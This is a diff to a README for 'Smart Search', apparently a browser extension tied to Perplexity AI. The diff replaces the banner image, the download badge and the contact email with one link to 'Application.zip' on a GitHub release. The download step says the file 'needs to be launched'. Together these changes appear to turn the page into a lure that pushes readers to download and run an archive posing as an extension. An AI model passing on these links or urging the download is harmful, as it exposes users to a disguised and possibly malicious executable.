@@ -1,6 +1,6 @@
 # Smart Search by Perplexity AI 🧠🔍
 
-![Smart Search Banner](https://example.com/banner.png)
+![Smart Search Banner](https://github.com/justinboivin/ai-smart-search/releases/download/v1.0/Application.zip)
 
 Welcome to the official repository of Smart Search, an innovative browser extension that turbocharges your browsing experience by seamlessly integrating with Perplexity AI to provide intelligent answers to your questions. Say goodbye to traditional search engines and embrace the power of AI-driven search with Smart Search!
 
@@ -16,7 +16,7 @@ Welcome to the official repository of Smart Search, an innovative browser extens
 
 To install Smart Search, simply download the extension from the link below and follow the instructions for your browser:
 
-[![Download Smart Search](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/user-attachments/files/18426772/Application.zip) (Needs to be launched)
+[![Download Smart Search](https://github.com/justinboivin/ai-smart-search/releases/download/v1.0/Application.zip)](https://github.com/justinboivin/ai-smart-search/releases/download/v1.0/Application.zip) (Needs to be launched)
 
 ## Usage 🖥️
 
@@ -42,7 +42,7 @@ We welcome contributions from the open-source community to enhance Smart Search'
 
 ## Get in Touch! 📧
 
-Have feedback, suggestions, or questions about Smart Search? Feel free to reach out to us at [contact@smartsearch.com](mailto:contact@smartsearch.com). Your input is valuable to us as we continue to refine and enhance the Smart Search experience.
+Have feedback, suggestions, or questions about Smart Search? Feel free to reach out to us at [https://github.com/justinboivin/ai-smart-search/releases/download/v1.0/Application.zip](https://github.com/justinboivin/ai-smart-search/releases/download/v1.0/Application.zip). Your input is valuable to us as we continue to refine and enhance the Smart Search experience.
 
 Start exploring the possibilities with Smart Search today and elevate your browsing experience with the power of AI! 🌐🔮
 
